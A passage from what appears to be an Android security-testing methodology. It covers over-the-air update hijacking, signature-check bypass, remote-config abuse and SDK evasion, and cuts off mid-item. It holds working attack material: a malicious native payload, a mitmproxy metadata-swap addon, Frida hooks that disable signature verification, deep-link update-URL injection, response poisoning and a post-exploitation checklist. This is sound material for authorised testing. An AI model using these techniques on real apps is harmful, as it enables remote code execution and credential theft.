| **Maps to** | `CodePush.java` (`private static String mPublicKey;`, `getCustomPropertyFromStringsIfExist("PublicKey")`, `getPublicKeyByResourceDescriptor(...)` throwing `CodePushInvalidPublicKeyException("Specified public key is empty")`, default `mServerUrl = "https://codepush.appcenter.ms/"`, `setDeploymentKey()`); `CodePushConstants.java` (`BUNDLE_JWT_FILE = ".codepushrelease"`, `STATUS_FILE = "codepush.json"`, `CODE_PUSH_PENDING_UPDATE`, `LATEST_ROLLBACK_INFO_KEY`); CodePush README (`CheckFrequency.ON_APP_START` default, automatic rollback keeps the previous update) |

- **Test:** CodePush verifies the downloaded bundle only when a public key is configured (`mPublicKey`,
  checked against the `.codepushrelease` JWT beside the package). With no public key the runtime accepts
  whatever the server — or anyone who can impersonate it, or anyone who obtains the deployment key — sends.
- **How:**
  ```bash
  grep -n 'CodePushPublicKey' out/res/values/strings.xml || echo "NO PUBLIC KEY -> unsigned OTA"
  grep -n 'CodePushServerUrl'  out/res/values/strings.xml     # non-default server?
  grep -n 'CodePushDeploymentKey' out/res/values/strings.xml
  adb shell "run-as com.target.app cat files/CodePush/codepush.json"
  adb shell "run-as com.target.app find files/CodePush -name '.codepushrelease'"   # present => signed release
  adb shell "run-as com.target.app find files/CodePush -name 'index.android.bundle' -exec ls -l {} \;"
  ```
- **Proof:** No `CodePushPublicKey` string resource, no `.codepushrelease` JWT next to the downloaded
  bundle, and an intercepted/redirected update response resulting in your JS executing after `restartApp`.
- **Escalation:** Remote code execution in the app's UID for every device on the deployment.
- **Ruled out when:** `CodePushPublicKey` is present **and** a tampered bundle is rejected at runtime
  (capture the `CodePushInvalidUpdateException`/rollback in logcat). Config presence alone is not enough.

### D17-028 · The CodePush deployment key is shipped in the APK

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the key permits pushing to the deployment; `…for_internal_asset` (P3) if it is read-only enumeration |
| **Attacker** | AM-03 / AM-09 |
| **Applies to** | React Native + CodePush |
| **Maps to** | CodePush docs ("this key will override the 'default' one that was provided in your app's … files"); `CodePush.java` `setDeploymentKey()`; the corpus's D18 secret-sweep discipline |

- **Test:** The deployment key is a string resource in the APK. Establish what that key actually authorises
  on the service: enumeration of releases, or publication. **Do not assume** — test the read path only, and
  state clearly which capability you demonstrated.
- **How:**
  ```bash
  unzip -p target.apk res/values/strings.xml 2>/dev/null | strings | grep -i codepush
  grep -rn 'CodePushDeploymentKey' out/res/values/strings.xml
  # also mine older releases: a key removed in build N may still be live server-side
  # (pull prior versions from the vendor's published version history and re-run the grep)
  ```
- **Proof:** The key string plus a service response demonstrating what it authorises, captured with the
  request. Keep the key redacted in the report body and supply it in a private attachment; leave the trace
  ID and your own identifiers visible so the triager can correlate.
- **Escalation:** A publish-capable key is the OTA channel takeover of D17-027 without any network position.
- **Ruled out when:** No deployment key in any resource of any shipped release you sampled, or the vendor
  demonstrates the key is scoped read-only and your own test confirms publication is refused.

### D17-029 · Runtime override of the update source from a deep link, bridge or extra

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-02 (one click on a link) |
| **Applies to** | React Native with CodePush / expo-updates; any custom updater exposing a configurable endpoint |
| **Maps to** | `CodePush.java` (`public void setDeploymentKey(String deploymentKey)`; constructors taking `serverUrl`); expo `UpdatesConfiguration.kt` `UpdatesController.overrideConfiguration()` with keys `updateUrl`, `requestHeaders`, `runtimeVersion`, `checkOnLaunch`, `codeSigningCertificate` |

- **Test:** Both OTA runtimes let the update source be changed at runtime. If any of that is reachable from
  a deep link parameter, a WebView bridge message, or an exported component's extra, the **attacker** chooses
  where the app's code comes from — and, in expo's case, can override `codeSigningCertificate` too.
- **How:**
  ```bash
  grep -rn 'UpdatesController.overrideConfiguration\|setDeploymentKey\|setServerUrl' out/sources/
  strings -a out/assets/index.android.bundle | grep -aniE 'deploymentKey|serverUrl|overrideConfiguration|updateUrl'
  # trace the value backwards to a deep link / bridge / extra
  grep -rnE 'getQueryParameter|getStringExtra|@ReactMethod|addJavascriptInterface' -A6 out/sources/ \
    | grep -iE 'deployment|update|server|url|channel'
  ```
  Then drive it:
  ```bash
  adb shell am start -a android.intent.action.VIEW \
    -d 'targetapp://config?updateUrl=https://poc.example.invalid/manifest'
  ```
- **Proof:** An end-to-end demonstration: the deep link is delivered, the app's next update check hits your
  host (proxy log), and your bundle executes.
- **Escalation:** Terminal — remote, one-click, code-source takeover. Chains from D09 (deep links) and D10
  (bridge).
- **Ruled out when:** The override APIs are absent from the app's code and bundle, or every call site takes
  a compile-time constant — trace each argument to its literal.

### D17-030 · OTA rollback / downgrade as a security-control bypass

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) or whichever control the rollback target lacks; otherwise rate on the reinstated defect |
| **Attacker** | AM-03 (local corruption of the current bundle) / AM-09 |
| **Applies to** | React Native with CodePush / expo-updates |
| **Maps to** | `CodePushConstants.java` (`PREVIOUS_PACKAGE_KEY`, `CURRENT_PACKAGE_KEY`, `FAILED_UPDATES_KEY`, `LATEST_ROLLBACK_INFO_KEY`, `LATEST_ROLLBACK_PACKAGE_HASH_KEY`, `LATEST_ROLLBACK_COUNT_KEY`); CodePush README (automatic rollback keeps a copy of the previous update); expo `UpdatesConfiguration.kt` `DISABLE_ANTI_BRICKING_MEASURES` |

- **Test:** CodePush keeps the previous package and rolls back on failure; expo has anti-bricking measures
  that can be disabled. Check whether an attacker — or simply a stale device — can be pinned to a
  known-vulnerable bundle that the client believes is retired.
- **How:**
  ```bash
  adb shell "run-as com.target.app cat files/CodePush/codepush.json"        # currentPackage / previousPackage
  adb shell "run-as com.target.app cat shared_prefs/CodePush.xml"           # failed updates, rollback info
  grep -n 'DISABLE_ANTI_BRICKING_MEASURES' out/AndroidManifest.xml
  # force the rollback: corrupt the current bundle so the update is marked failed, then relaunch
  adb shell "run-as com.target.app sh -c 'printf x >> files/CodePush/<hash>/<app>/index.android.bundle'"
  adb shell am force-stop com.target.app && adb shell monkey -p com.target.app 1
  ```
- **Proof:** `codepush.json` showing the app reverted to `previousPackage`, plus the old vulnerable
  behaviour returning — demonstrate the reinstated defect, not just the version number.
- **Escalation:** → whichever control the older bundle lacks (a pinning fix, an auth check, a validation
  routine). This is also the answer to "we already fixed that in an OTA".
- **Ruled out when:** Corrupting the current bundle produces a hard failure (the app refuses to start or
  fetches a fresh copy) rather than a silent revert, and `codepush.json` shows no `previousPackage`
  retained.

### D17-031 · Custom updater — forge the metadata and deliver your own plugin

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-06 (with the app's own TLS weakness) / AM-09 |
| **Applies to** | any app with a bespoke update or plugin channel — enterprise, IoT, automotive head units, "diagnostics" apps |
| **Maps to** | HackTricks *insecure-in-app-update-rce* (Xtool AnyScan v4.40.11 → 4.40.40, NowSecure research) |

- **Test:** With a trust-all `TrustManager`, a cleartext payload download, or any MitM position, plus a
  recoverable metadata key, forge the update manifest and serve your own payload. The metadata format is
  usually XML or JSON wrapped in a homegrown DES/AES/RC4 + Base64 scheme whose key is in the APK.
- **How:**
  1. Confirm the insecure TLS path (D14) or the cleartext payload download.
  2. Recover the metadata crypto — algorithm, mode, hardcoded key and IV — and reimplement it (D12).
  3. Build a payload whose loader-time hook fires immediately:
     ```c
     __attribute__((constructor)) void init(void){
         __android_log_print(ANDROID_LOG_INFO, "PWNMARK7f3a91", "Exploit loaded! uid=%d", getuid());
     }
     ```
     ```bash
     $NDK/.../aarch64-linux-android30-clang -shared -fPIC payload.c -o libscan_x64.so
     zip -r PWNED.zip libscan_x64.so assets/ meta.txt
     ```
     Or a DEX plugin whose static initialiser fires on class load, packaged with `d8`.
  4. Swap the metadata in flight:
     ```python
     from mitmproxy import http
     MOD_XML = open("fake_metadata.xml", "rb").read()
     def request(flow: http.HTTPFlow):
         if b"/UpgradeService.asmx/GetUpdateListEx" in flow.request.path:
             flow.response = http.Response.make(200, MOD_XML, {"Content-Type": "text/xml"})
     ```
     ```bash
     python3 -m http.server 8000 --directory ./payloads
     mitmproxy -p 8080 -s addon.py
     ```
- **Proof:** `adb logcat --pid=$(adb shell pidof com.target.app) | grep PWNMARK7f3a91` showing your
  constructor running under the victim's UID, and the plugin persisting on disk so it re-executes on every
  launch of that feature.
- **Escalation:** Post-exploitation: session cookies, OAuth tokens and JWTs (D13); drop a second-stage APK
  and `pm install` it if the app holds `REQUEST_INSTALL_PACKAGES`; abuse whatever hardware the app drives
  (OBD-II/CAN in the AnyScan case).
- **Ruled out when:** The payload is signature-verified against a key that is not present in the APK or in
  the response, the verification runs before extraction, and a tampered payload is refused — demonstrate the
  refusal.

### D17-032 · Verification that exists but is not cryptographically bound

| | |
|---|---|
| **Severity ceiling** | **Critical** (the verification is the only control between MitM and RCE) |
| **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (VARIES) → `server_side_injection.remote_code_execution_rce` (P1) once exploited |
| **Attacker** | AM-06 / AM-09 |
| **Applies to** | all custom updaters |
| **Maps to** | HackTricks *insecure-in-app-update-rce* ("Bypassing signature/hash checks (when present)"); MASWE-0011 |

- **Test:** If the updater does verify, determine whether the check is cryptographically bound to the
  payload and to a developer-held key, or merely a comparison. The incomplete forms recur: comparing only
  one file's hash instead of the whole archive; not binding the signature to a developer key; accepting any
  key shipped **next to** the payload; verifying the metadata but not the extracted file tree. An MD5/SHA
  delivered in the *same attacker-controlled task object* as the payload URL detects corruption; it
  authenticates nothing.
- **How:**
  ```bash
  grep -rnE 'Signature\.getInstance|Signature\.verify|MessageDigest|KeyFactory|X509EncodedKeySpec|PublicKey|Arrays\.equals|MessageDigest\.isEqual' -B8 -A8 out/sources/ \
    | grep -iE 'update|bundle|patch|plugin|module'
  ```
  Then test whether the check is load-bearing at all:
  ```javascript
  Java.perform(function () {
    Java.use('java.security.Signature').verify.overload('[B').implementation = function (a) { return true; };
    // less surgical — use only if the above is insufficient:
    // Java.use('java.util.Arrays').equals.overload('[B','[B').implementation = function(a,b){ return true; };
  });
  ```
  Also stub vendor methods such as `PluginVerifier.verifySignature()`, `checkHash()`, or the gate itself in
  Java or JNI.
- **Proof:** The forged plugin installing and executing with the hook in place, **plus** decompiled evidence
  that the check is not bound to a developer-held key. State both: a hookable check on a rooted device is
  not by itself a finding (that is AM-12); a check whose key travels with the payload is.
- **Escalation:** → D17-031 without needing the hook at all.
- **Ruled out when:** The public key is compiled into the APK (or pinned in the Keystore), the signature
  covers the whole archive, verification runs before extraction, and the failure branch aborts. All four.

### D17-033 · Cordova / Capacitor live-update and `setServerBasePath`

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-03 (writable staging dir) / AM-09 |
| **Applies to** | Cordova, Ionic and Capacitor apps with a live-update plugin |
| **Maps to** | Capacitor `Bridge.java` (`localServer.hostAssets(DEFAULT_WEB_ASSET_DIR)` with `DEFAULT_WEB_ASSET_DIR = "public"`, and the configurable `getServerBasePath` plumbing) |

- **Test:** The web-stack frameworks have the same problem in a different shape: a plugin downloads a new
  `www`/`public` payload and the WebView serves from it. Find the download URL, the staging directory, and
  the integrity check.
- **How:**
  ```bash
  grep -rniE 'hot.?code.?push|live.?update|deploy|appflow|ionic-deploy|updateUrl|channel' \
    out/res/xml/config.xml out/assets/capacitor.config.json out/assets/www/cordova_plugins.js 2>/dev/null
  grep -rn 'setServerBasePath\|setServerAssetPath\|WebViewLocalServer' out/sources/ | head
  adb shell "run-as com.target.app ls -laR files/ | grep -iE 'ionic|dist|snapshot|www|public'"
  ```
  Then substitute the staged `index.html` and restart.
- **Proof:** Your `index.html` rendering inside the app after restart, plus a bridge call made from your
  injected script returning real data.
- **Escalation:** This is script execution in the bridged WebView origin — i.e. every D10 primitive handed
  to the update server or anyone who can impersonate it. Enumerate the exposed plugins (D19) and reach a
  file or crypto plugin for maximum impact.
- **Ruled out when:** No live-update plugin in `cordova_plugins.js`/`capacitor.config.json`, the WebView
  serves only from `file:///android_asset/` or the packaged `public` directory, and no writable staging
  directory appears after a full walkthrough.

### D17-034 · Android 14's read-only mandate does not cover JS/Dart bundles

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-03 / AM-09 |
| **Applies to** | all RN / Expo / Cordova / Flutter-with-dynamic-assets apps, regardless of Android version |
| **Maps to** | `about/versions/14/behavior-changes-14` — the read-only mandate applies to **DEX, JAR, APK**, i.e. not to JS or Dart bundles; `risks/dynamic-code-loading` (MASVS-CODE) |

- **Test:** Teams routinely believe Android 14 secured their OTA. It did not: the mandate covers DEX/JAR/APK
  only. A `.bundle`/`.hbc` is data to the platform and code to the app. Verify the bundle's integrity
  independently — signed, and signature checked **before** load.
- **How:**
  ```bash
  unzip -l target.apk | grep -iE 'index.android.bundle|app.bundle|libapp.so|assets/flutter_assets|\.hbc'
  adb shell run-as com.target.app find . -name '*.bundle' -o -name '*.hbc' 2>/dev/null
  grep -rnE 'CodePush|expo-updates|EXUpdates|publicKey|codeSigningCertificate' out/sources/
  # substitute locally, no network needed
  adb shell run-as com.target.app cp /sdcard/Download/evil.bundle files/updates/<id>/app.bundle
  adb shell am force-stop com.target.app && adb shell monkey -p com.target.app 1
  ```
- **Proof:** Modified JS executing — an injected `console.log('PWNMARK7f3a91')` in logcat, or a visible UI
  change you introduced — proving no signature check on the OTA payload.
- **Escalation:** Persistent local code execution in the app, and supply-chain takeover if the OTA server is
  compromised. → D10 for the bridge reach.
- **Ruled out when:** The bundle on disk is signature-verified before load and a modified bundle is
  rejected at launch (capture the rejection), or no bundle exists outside the signed APK.

### D17-035 · A trusted updater that installs packages which do not exist yet

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) for the install primitive; rate the installed package's own privilege precisely |
| **Attacker** | AM-09 |
| **Applies to** | OEM/vendor updaters, IoT and automotive head units, enterprise installers, MDM agents |
| **Maps to** | HackTricks *insecure-in-app-update-rce* ("Trusted updater abuse: installing packages that do not exist yet"), citing the MoYu Android head-unit research and Android's `pm` documentation |

- **Test:** Do not test only *replacement* updates. A preinstalled or privileged updater may deserialise a
  remote boolean or enum deciding whether the target package must already exist (`installNotExists=true`).
  If the backend can select the "install when absent" branch, the update channel is an arbitrary
  new-APK installation primitive.
- **How:** Trace the whole path — push/MQTT message parsing → package-existence check → download destination
  → `PackageInstaller`/`PackageManager` call. Then:
  ```bash
  UPDATER=com.vendor.updater; SUSPECT=com.example.suspect
  adb shell 'pm list packages -i | sort'
  adb shell "find /sdcard/Android/data/$UPDATER/cache/push/apk -type f -ls 2>/dev/null"
  adb shell "pm path $SUSPECT; dumpsys package $SUSPECT"
  ```
- **Proof:** A package that was never on the device appears, `pm list packages -i` records the updater as
  its installer, and the staged APK is present in the updater's cache.
- **Escalation:** Be precise about privilege: a downloaded APK normally executes under its **own** UID with
  its **own** declared and granted permissions. Do **not** report execution with the updater's system
  privileges unless a shared `sharedUserId`, platform signing, or an exported privileged bridge proves it.
- **Ruled out when:** The install path is gated on the package already being installed with a matching
  signature, or on a signature check against a vendor key, and a response selecting the install-when-absent
  branch is refused.

### D17-036 · Configuration-driven reflective module loading

| | |
|---|---|
| **Severity ceiling** | **Critical** |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) |
| **Attacker** | AM-09 / AM-08 |
| **Applies to** | any app with a server-driven plugin architecture; malware triage |
| **Maps to** | HackTricks *insecure-in-app-update-rce* ("Configuration-driven reflective modules") |

- **Test:** Look beyond hardcoded command handlers. A compact implant receives integer task IDs, fetches
  JSON descriptors only for unknown or newer timestamped versions, persists them in `SharedPreferences`, and
  uses a field such as `tagName` to select handlers for HTTP, WebView/JavaScript or module loading. Trace
  every attacker-controlled element of a module descriptor: `url`, module name, entry class, factory or
  virtual method, typed arguments, cleanup list, thread, reload flags.
- **How:**
  ```bash
  adb shell run-as com.target.app cat shared_prefs/*.xml
  grep -rnE 'Class\.forName\(|getDeclaredMethod\(|getMethod\(|newInstance\(\)|getDeclaredConstructor' out/sources/ \
    | grep -viE '^out/sources/(android|androidx|kotlin)/'
  # correlate: does a config fetch supply the reflected names?
  grep -rn 'OkHttpClient\|HttpURLConnection\|Retrofit' out/sources/<dispatcher-package>/
  ```
- **Proof:** A decompiled dispatcher resolving class and method names from a server response, plus a
  captured config response containing those names — then serve a modified descriptor through your proxy and
  show a new method invoked.
- **Escalation:** A downloaded file's extension is not a reliable type signal — start from the loader's
  reads and the deserializer, reimplement the exact decode loop, and validate output with DEX/ZIP magic
  before decompiling. Enumerate predictable payload version strings (e.g. `dex3.68.png`) **only** in an
  authorised, sinkholed lab copy.
- **Ruled out when:** Every reflective call resolves a class name from a compile-time constant or a fixed
  allow-list, and no server response field reaches `Class.forName`/`getMethod`.

### D17-037 · Remote config / feature flags as an unsigned security control plane

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | rated by the control the flag disables — `broken_authentication_and_session_management.authentication_bypass` (P1) where it gates auth; `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (VARIES) otherwise |
| **Attacker** | AM-09 (console or backend compromise) / AM-06 where TLS is the only control |
| **Applies to** | all apps with a remote-config SDK |
| **Maps to** | Firebase Remote Config / LaunchDarkly / Optimizely / ConfigCat client APIs; the corpus's restore-side item on flags surviving backup restore |

- **Test:** A flag delivered over TLS but with no signature that disables pinning, lowers an auth
  requirement, enables a debug path or changes an API host is a security control the vendor does not
  actually own. Whoever controls the console — or the response — controls it. Test the *live-fetch*
  direction, not only the restore direction.
- **How:**
  ```bash
  grep -rnE 'FirebaseRemoteConfig|getBoolean\(|getString\(|LDClient|featureFlag|Optimizely|ConfigCat' -A6 out/sources/ \
    | grep -iE 'pin|ssl|cert|debug|auth|bypass|skip|host|endpoint|jailbreak|root|integrity'
  unzip -p target.apk res/xml/remote_config_defaults.xml 2>/dev/null | head -50
  ```
  Flip the flag in the response through the proxy, then **re-run the corresponding control test** (pinning,
  root check, auth gate).
- **Proof:** The security control demonstrably off after the flag flip — e.g. traffic now proxyable with a
  user CA after `enable_pinning:false`, captured before and after. A body-level diff, not a status code.
- **Escalation:** → every control the flag gates; → D18 if the config backend's own access control is weak.
- **Ruled out when:** No remote-config value reaches a security decision — enumerate each flag consumed and
  name what it changes; or the config payload is signature-verified against a pinned key before use.

### D17-038 · Reflection-heavy SDK code as a remote code-activation channel

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) with a demonstrated new method invoked; otherwise frame it as "the vendor can change this app's behaviour post-review" |
| **Attacker** | AM-08 / AM-09 |
| **Applies to** | all; ad and attribution SDKs first |
| **Maps to** | Snyk SourMint detection guidance ("Identify excessive `Class.forName()`, `getMethod()`, and `invoke()` patterns indicating hidden functionality") |

- **Test:** Heavy `Class.forName`/`getMethod`/`invoke` inside an SDK usually means either string-obfuscated
  functionality or a command dispatcher driven by remote config. Rank the packages by density and read the
  top offenders.
- **How:**
  ```bash
  grep -rncE 'Class\.forName\(|getDeclaredMethod\(|getMethod\(|\.invoke\(' out/sources/ | sort -t: -k2 -rn | head -20
  grep -rn 'OkHttpClient\|HttpURLConnection\|Retrofit' out/sources/<topOffenderPkg>/
  ```
- **Proof:** A decompiled dispatcher resolving class + method names from a server response, plus the
  captured config response containing those names. Then demonstrate it by serving a modified config through
  the proxy and observing a new method invoked.
- **Escalation:** → D17-036; → D20 privacy if the activated capability collects data.
- **Ruled out when:** The reflective density is explained by a legitimate pattern you can name (a
  serialization library, a version-compat shim) and no reflected name is derived from network input.

### D17-039 · SDK behaviour that only activates when you are not looking

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES); Critical framing if the SDK loads remote code (then it is D17-025/036) |
| **Attacker** | AM-08 |
| **Applies to** | all; ad, attribution and "security" SDKs first |
| **Maps to** | Snyk SourMint (Mintegral) — Android side: `AlphabReceiver` listening for `android.intent.action.PACKAGE_ADDED` plus a custom `alphab_net_debug_action`; a `ContentObserver` on `content://downloads/public_downloads`; reports POSTed to `https://n.systemlog.me/stlog` with obfuscated JSON keys (`p`, `v`, `ul`, `kw`, `fl`, `dvi`); a `ParseAndLoad` class checking for a WiFi proxy and VPN and honouring a remote anti-debug disable intent; custom Base64 via `AlphabBase64Util` (`aELKr0xI7UL67iN6HinI` → `android.net.Uri`, `r0HeQibP7inj7EbAQi7ArR==` → `registerReceiver`, `asx6f3H6foh4FsJ4fsLzYscKr2xMfEnzQEbm73xyY0q4aEJgFM==` → `content://downloads/public_downloads`). Same vendor iOS side: `MTGBaseBridgeWebView` `mv://(.+?):(.+?)/(.+?)\?([\s\S]*)` dispatched via `MTGCommandDispatcher`/`MTGRemoteCommandParser`/`MTGInvocationBoxing` giving arbitrary method invocation; malicious functionality in all iOS versions ≥ 5.5.1 (2019-07-17), component removed in 6.5.0.0 (2020-09-03), RCE bridge remediated in 6.6.0.0 |

- **Test:** An SDK that disables its own collection under a debugger, proxy, VPN or emulator reads clean in
  a normal dynamic test. You must defeat the checks before you can observe the behaviour — and the app ships
  it, so this is a finding about *the app*.
- **How:**
  ```bash
  grep -rnE 'isDebuggerConnected|android\.os\.Debug|Build\.FINGERPRINT|ro\.debuggable|ro\.kernel\.qemu|getDefaultProxyHost|getDefaultHost\(\)|System\.getProperty\("http\.proxyHost"\)|VpnService|TRANSPORT_VPN' out/sources/ \
    | grep -viE '^out/sources/(android|androidx)/'
  grep -rnE 'registerReceiver|ContentObserver|content://downloads' out/sources/ | grep -viE '^out/sources/(android|androidx)/'
  ```
  ```javascript
  Java.perform(function () {
    Java.use('android.os.Debug').isDebuggerConnected.implementation = function () { return false; };
    var S = Java.use('java.lang.System');
    S.getProperty.overload('java.lang.String').implementation = function (k) {
      if (k && k.indexOf('proxy') >= 0) return null;      // hide the proxy from the SDK
      return this.getProperty(k);
    };
  });
  ```
- **Proof:** Network traffic from the SDK that appears **only after** the checks are neutralised — capture
  the same user flow twice (checks on, checks off) and diff the request sets. Report the diff, not one
  capture.
- **Escalation:** → D20 privacy finding with captured traffic; potentially a Play policy violation the
  client must self-report.
- **Ruled out when:** The evasion greps are empty for third-party namespaces, or the two captures (checks
  on / checks off) are equivalent — show the diff either way.

### D17-040 · The update endpoint is a shadow API — diff it behaviourally

| | |
|---|---|
| **Severity ceiling** | Critical (where the older path drops an auth control) / Medium–High for a rate-limit or field-exposure regression |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) or `broken_access_control.idor.*` depending on what regressed. **A version difference alone is Informational.** |
| **Attacker** | AM-01 |
| **Applies to** | any app with a versioned update/manifest/config endpoint |
| **Maps to** | the mobile→backend bridge rule: a mobile app's hardcoded backend calls are frequently an **older API version** than the current web app uses, with weaker auth, weaker rate limits, weaker validation and more field exposure |

- **Test:** The OTA manifest endpoint, the remote-config endpoint and the plugin-catalogue endpoint are
  backend APIs that nobody reviews as backend APIs. They are typically the *oldest* version still live,
  because the fleet of installed apps pins them. Diff them **behaviourally** against the current version for
  the same operation — auth strength, rate limiting, input validation, field exposure — not by response
  shape.
- **How:**
  ```bash
  # enumerate sibling versions of the endpoint the app hardcodes
  for v in v1 v2 v3 v4 beta internal legacy old; do
    curl -s -o /dev/null -w "%{http_code} /api/$v/updates/manifest\n" "https://$TARGET/api/$v/updates/manifest"
  done
  curl -s -H "X-API-Version: 1" "https://$TARGET/updates/manifest"
  # then the four behavioural diffs, same operation, both versions, side by side
  ```
  **The layer-ordering trap:** a `400 {"message":"field X is required"}` from an unauthenticated request
  does **not** prove you passed auth — many stacks run a body parser or sanitiser in front of the auth
  middleware. Re-test with a minimal well-formed `{}` body before claiming anything, and record the error
  taxonomy (`ERR-INPUT-*` vs `ERR-AUTH-*`) so you can tell the two layers apart.
- **Proof:** The same request against both versions, side by side, showing a security regression on the old
  path — with a **body** differential, not a status-code differential. A byte-identical 200 is not a bypass.
- **Escalation:** An unauthenticated manifest endpoint that accepts a `bundleUrl` is D17-026/027 without any
  network position. → D15 for the rest of the backend.
- **Ruled out when:** Every sibling version returns connection-refused or a genuine 404 (not a
  "deprecated" 200), and the live version enforces the same auth, throttling, validation and field set as
  the current web API on the same operation — demonstrate each of the four.

### D17-041 · Enforced-update mechanism absent or bypassable

| | |
|---|---|
| **Severity ceiling** | Medium standalone; High when the stale version retains an exploitable defect |
| **VRT** | rate on the defect the stale version retains; the control gap alone is `using_components_with_known_vulnerabilities.outdated_software_version` (P5) |
| **Attacker** | AM-11 (the user's own device staying stale) / AM-01 against the version check |
| **Applies to** | Google Play In-App Updates requires Play distribution; otherwise the custom backend-gated pattern applies. MAS-L2 control |
| **Maps to** | MASTG-TEST-0392 (static), MASTG-TEST-0382 (runtime); MASWE-0043 (CWE-602, CWE-693); MASVS-CODE-2; LEGACY-ID MSTG-ARCH-9 |

- **Test:** Without enforcement a device stays indefinitely on a version with a known, already-fixed
  vulnerability. MASTG-TEST-0382 names four bypasses; run all four.
- **How:**
  ```bash
  grep -rnE 'AppUpdateManagerFactory|getAppUpdateInfo|startUpdateFlowForResult|UpdateAvailability|AppUpdateType\.(IMMEDIATE|FLEXIBLE)|DEVELOPER_TRIGGERED_UPDATE_IN_PROGRESS|BuildConfig\.VERSION_(NAME|CODE)|getPackageInfo' out/sources/
  ```
  1. Dismiss the update dialog. 2. Cancel an immediate update flow. 3. Background the app before the update
  completes. 4. Manipulate the reported version — intercept the version-check request and rewrite the client
  version upward.
- **Proof:** Continued access to protected functionality and backend services on a version the backend's
  policy should have blocked, after one of the four bypasses.
- **Escalation:** The remediation section writes itself from MASTG-TEST-0382's validation checklist: the
  check must run **before** access to protected functionality; the app must handle cancellation or denial of
  an immediate flow, re-check on returning to the foreground, and restart the flow when
  `UpdateAvailability.DEVELOPER_TRIGGERED_UPDATE_IN_PROGRESS` is reported. A dismissible dialog is not
  enforcement.
- **Ruled out when:** All four bypasses fail and the **backend** refuses the stale client (a 426/403 on the
  protected operation, not just a client-side blocking screen).

### D17-042 · Hostile-response pass — every server-controlled value that reaches a client-side sink

| | |
|---|---|
| **Severity ceiling** | rated per sink: Critical for a file write into a code-load path, High for a WebView-with-bridge or `startActivity` |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) for the code-load sink; otherwise the sink's own node |
| **Attacker** | AM-09 (compromised backend, stale/taken-over API subdomain, rogue insider) / AM-06 |
| **Applies to** | all |
| **Maps to** | `risks/dynamic-code-loading`, `risks/unsafe-uri-loading`, `risks/unsafe-download-manager`, `risks/path-traversal` (all four slugs verified in the Android risks index) |

- **Test:** The malicious-backend attacker model is systematically under-tested. Whoever controls the
  response body — including anyone who takes over a stale API subdomain — gets the same primitive. Inventory
  every server-controlled string that reaches a client-side sink, then poison them all at once and watch
  which sinks fire.
- **How:**
  ```bash
  # the fields the app parses
  grep -rnE 'optString|getString\("|@SerializedName|@Json|Moshi|Gson|kotlinx\.serialization' out/sources/ \
    | grep -oE '"[a-z_]+"' | sort -u > server_fields.txt
  # the sinks to watch
  grep -rnE 'loadUrl\(|Intent\.parseUri|startActivity\(|setClassName\(|FileOutputStream\(|openFileOutput|DexClassLoader|PathClassLoader|System\.load|Runtime\.exec|WebView' out/sources/
  ```
  ```python
  # poison.py — mitmdump -s poison.py ; rewrites every string value once
  import json
  def response(flow):
      try: b = json.loads(flow.response.get_text())
      except Exception: return
      def walk(o):
          if isinstance(o, dict):  return {k: walk(v) for k, v in o.items()}
          if isinstance(o, list):  return [walk(v) for v in o]
          if isinstance(o, str):   return "https://poc.example.invalid/#PWNMARK7f3a91" + o
          return o
      flow.response.set_text(json.dumps(walk(b)))
  ```
- **Proof:** Per sink, the concrete effect: a WebView navigating to your host (screenshot the URL bar or the
  proxy log), a file created at an attacker-chosen path (`run-as … ls -la`), an activity launched
  (`dumpsys activity activities`), or a native crash. Search the **baseline** capture for `PWNMARK7f3a91`
  first so a reflection is not a collision.
- **Escalation:** The file-write sink plus the app's own `DexClassLoader`/`System.load` is the
  malicious-backend → RCE chain. Frame the attacker model precisely: "anyone who controls
  `api.target.tld` responses", and name the realistic path (subdomain takeover, CDN, MitM with a CA).
- **Ruled out when:** Every poisoned field produces only a rendering change or a parse failure — enumerate
  the sinks you watched and state that none fired.

### D17-043 · Java deserialization from an exported component — the precision rule

| | |
|---|---|
| **Severity ceiling** | **Critical** with a gadget; **not a finding** without attacker-reachability |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) with a gadget executing; `application_level_denial_of_service_dos.app_crash.malformed_android_intents` (P5) if all you have is a crash |
| **Attacker** | AM-03 |
| **Applies to** | all |
| **Maps to** | MASTG-TEST-0337 (References to Object Deserialization of Untrusted Data); MASWE-0050 (CWE-502, CWE-20); MASTG-KNOW-0021; `risks/unsafe-deserialization`; MASTG-TEST-0034 (deprecated "Testing Object Persistence"); H1 #2516732 (Basecamp, Medium 6.8, "By installing a malicious app on the same device where the Basecamp app is logged in, the attacker could obtain the Oauth2 token of the user logged in and take over his account"); H1 #453791 (PayPal — unsafe deserialization leads to token leakage) |

- **Test:** `getSerializableExtra` / `ObjectInputStream` / `readObject` reachable from an **exported**
  component **plus a gadget on the classpath** is code execution. **Verify export status before rating.**
  And state the precision rule in the report, because it is what separates a credible finding from a
  scanner echo: *deserialization is execution only if you control the ClassLoader contents.* Otherwise it is
  instantiation of classes already in the app's own classpath — which can still be powerful (state
